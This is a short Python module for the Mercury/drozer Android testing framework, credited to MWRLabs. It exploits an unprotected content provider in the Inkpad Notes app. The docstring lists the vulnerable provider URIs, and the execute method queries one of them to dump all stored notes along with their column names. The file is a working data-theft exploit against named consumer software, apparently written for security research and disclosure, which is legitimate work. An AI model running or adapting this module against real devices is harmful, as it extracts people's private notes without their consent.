from merc.lib.modules import Module
class inkpad_notes(Module):
    """Extract Notes from Inkpad's vulnerable content provider
https://play.google.com/store/apps/details?id=com.workpail.inkpad.notepad.notes
Vulnerable Content Providers:
================================================
content://com.workpail.inkpad.provider.NotePad/live_folders/notes
content://com.workpail.inkpad.provider.NotePad/notes
content://com.workpail.inkpad.provider.NotePad/notes/
content://com.workpail.inkpad.provider.NotePad/notes/#
Henry Hoggard - MWRLabs"""
    
    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "thirdparty"]

    def execute(self, session, _arg):
	request = {}
        request['Uri'] = "content://com.workpail.inkpad.provider.NotePad/notes"
        request['showColumns'] = "true"

        print session.executeCommand("provider", "query", request).getPaddedErrorOrData()

